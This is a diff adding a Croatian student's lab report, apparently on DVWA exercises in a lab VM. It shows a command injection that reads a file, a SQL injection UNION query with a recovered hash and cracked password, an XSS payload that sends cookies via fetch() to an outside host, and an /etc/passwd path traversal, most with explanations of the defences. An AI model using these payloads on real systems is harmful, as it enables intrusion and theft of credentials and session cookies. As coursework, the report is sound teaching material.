@@ -1,0 +1,27 @@
+Zadatak 1.
+Korištena naredba: 
+1 | cat ~/tmp/0036560951.txt
+U source file-u vidim kako se za Linux koristi naredba  $cmd = shell_exec( 'ping  -c 4 ' . $target );. Kada se pošalje korištena naredba, u bash-u se izvedu dvije naredbe, jedna je ping -c 4 1 i nakon toga cat ~/tmp/0036560951.txt što ispiše sadržaj generirane datoteke.
+Sadržaj datoteke:
+This is a personalized file. Its content below is required to be returned as part of the task.
+017d7a5eb47f4884dd2eb02ee607987a
+
+Zadatak 2.
+Korišteni upit: 1' UNION SELECT first_name,  password FROM users WHERE user = 'student_60951
+U source kodu je vidljivo kako se šalje upit:
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+koristimo li id koji sam naveo u početku odgovora dobimo upit koji traži user-e s id=1 i first name i password usera čije je polje user=student_60951
+dohvaćeni hash: 637c7074b11c35828e725a3b70ce45ea
+konačno dobivena lozinka: 5b60cef2a1
+
+Zadatak 3.
+PHPSESSID=ibbl08tn1saqa61i19h6hecbh1
+<script>alert(document.cookie)</script>
+<script> fetch(`http://mrepro.tel.fer.hr/srs?cookie=` + document.cookie + `&jmbag=0036560951`)</script>
+U source kodu je vidljivo kako se sanitizira message input samo za specijalne znakove vezane za SQL a ne sanitizira se za JavaScript kod. Zbog toga se može ubacivati bilo koji kod unutar <script>. Na frontendu je na message textarea maxlength="50" što jedino spriječava ubacivanje veće skripte. Kada u inspectu promjenimo tu vrijednost na neku veću, možemo poslati kod koji sam napisao na početku zadatka i poslati cookie sa trenutne stranice.
+Od ovakvog napada možemo se obraniti koristeći input sanitization za JavaScript kod, input validation ili HttpOnly.
+
+Zadatak 4.
+korištena naredba: http://192.168.56.101/vulnerabilities/fi/?page=../../../../../etc/passwd
+U source kodu je vidljivo kako server ne koristi nikakav input validation, tako da u url možemo staviti bilo što uključujući i znakove ../. Korištenjem tih znakova konstantno smo se vraćali i došli do roota virtualnog stroja na kojem se vrti server. Tako možemo pristupiti fileovima do kojih ne bi trebali imati pristup te ih pročitati.
+Od ovakvog napada možemo se obraniti kao što vidimo u ostalim razinama sigurnosti u source fileu pomoću input validation (ne dopuštamko znakove poput ../ ili dopuštamo samo datoteke koje započinju sa file). Najbolja opcija je imati strogo definirane dopuštene putanje i ako unos nije jedan od tih stringova pristup se blokira. 
